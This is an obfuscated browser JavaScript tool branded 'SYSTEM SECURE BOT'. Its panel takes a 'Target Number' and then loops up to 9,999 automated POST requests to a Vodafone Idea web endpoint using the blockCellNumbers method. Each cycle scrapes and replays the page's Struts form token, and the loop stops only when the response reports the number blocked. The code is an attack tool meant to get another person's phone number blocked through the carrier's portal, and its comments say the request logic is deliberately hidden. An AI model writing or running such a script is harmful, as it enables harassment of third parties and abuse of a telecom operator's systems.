/* 
 * SYSTEM PROTECTED MODULE v7.0
 * Ultra-Secure Logic + Premium Dark UI
 */
(function() {
    'use strict';

    let _0xkd8 = false, _0xst9 = false, _0xcrq = 0, _0xtrq = 0x270F;
    let _0xmn = "", _0xctk = null, _0xwait = 0x190; 

    // Wahi Best Design jo aapko pasand aaya
    const _0xpanel = document.createElement('div');
    _0xpanel.innerHTML = `<div id="blockControlPanel" style="position:fixed;top:20px;right:20px;width:350px;background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%);border-radius:10px;padding:20px;color:white;z-index:10000;box-shadow:0 10px 40px rgba(0,0,0,0.8);font-family:sans-serif;border:1px solid #4facfe;">
        <div style="text-align:center;font-weight:bold;margin-bottom:15px;font-size:18px;letter-spacing:1px;color:#00f2fe;">🛡️ SYSTEM SECURE BOT</div>
        <input type="text" id="mobileNumber" placeholder="Target Number" style="width:90%;padding:12px;margin-bottom:15px;border-radius:8px;border:none;background:rgba(255,255,255,0.1);color:white;outline:none;">
        <div style="display:flex;gap:10px;margin-bottom:15px;">
            <button id="startBtn" style="flex:1;padding:12px;background:#00b09b;border:none;color:white;font-weight:bold;cursor:pointer;border-radius:8px;">▶ START</button>
            <button id="stopBtn" style="flex:1;padding:12px;background:#962626;border:none;color:white;font-weight:bold;cursor:pointer;border-radius:8px;">⏹ STOP</button>
        </div>
        <div style="background:rgba(0,0,0,0.5);padding:15px;border-radius:8px;text-align:center;border-top:1px solid #4facfe;">
            <div id="liveCounter" style="font-size:26px;font-weight:bold;color:#00f2fe;">0 / 0</div>
            <div id="statusMsg" style="font-size:11px;margin-top:5px;opacity:0.8;">System Encrypted & Ready</div>
        </div>
        <div id="responseLog" style="height:110px;overflow-y:auto;font-size:10px;margin-top:12px;background:rgba(0,0,0,0.3);padding:8px;border-radius:5px;font-family:monospace;"></div>
    </div>`;
    document.body.appendChild(_0xpanel);

    function _0xlog(m, t) {
        const l = document.getElementById('responseLog');
        const e = document.createElement('div');
        e.style.color = t === 's' ? '#00f2fe' : t === 'e' ? '#ff4b2b' : '#fff';
        e.innerHTML = `[${new Date().toLocaleTimeString()}] ${m}`;
        l.appendChild(e); l.scrollTop = l.scrollHeight;
    }

    // Asli Request Logic (Hidden inside)
    async function _0xreq(t) {
        try {
            const r = await fetch("https://vodafoneidea.com", {
                "method": "POST",
                "headers": { "content-type": "application/x-www-form-urlencoded" },
                "body": `org.apache.struts.taglib.html.TOKEN=${t}&method=blockCellNumbers&entityType=22&cellNumberChecked=${_0xmn}`
            });
            const h = await r.text();
            if (h.includes("Successfully Blocked")) return "S";
            if (h.includes("already Blocked")) return "A";
            const nt = h.match(/value="([a-f0-9]+)"/);
            return nt ? nt[1] : null;
        } catch (e) { return null; }
    }

    async function _0xexec() {
        while(_0xkd8 && !_0xst9 && _0xcrq < _0xtrq) {
            let res = await _0xreq(_0xctk || "");
            _0xcrq++;
            document.getElementById('liveCounter').innerText = `${_0xcrq} / ${_0xtrq}`;
            
            if (res === "S") {
                _0xlog("✅ Successfully Blocked!", "s"); _0xst9 = true;
            } else if (res === "A") {
                _0xlog("⚠️ Already Blocked!", "e"); _0xst9 = true;
            } else if (res) {
                _0xctk = res; _0xlog(`Cycle ${_0xcrq}: Token Active`, "i");
            } else {
                _0xlog("❌ Connection Error, Retrying...", "e");
            }
            await new Promise(r => setTimeout(r, _0xwait));
        }
        _0xkd8 = false;
        document.getElementById('statusMsg').innerText = "⏹ Bot Finished";
    }

    document.getElementById('startBtn').onclick = () => {
        _0xmn = document.getElementById('mobileNumber').value.trim();
        if(!_0xmn) return;
        _0xkd8 = true; _0xst9 = false; _0xcrq = 0;
        document.getElementById('responseLog').innerHTML = "";
        document.getElementById('statusMsg').innerText = "🚀 Bot Running...";
        _0xexec();
    };
    
    document.getElementById('stopBtn').onclick = () => { _0xst9 = true; _0xkd8 = false; };
})();
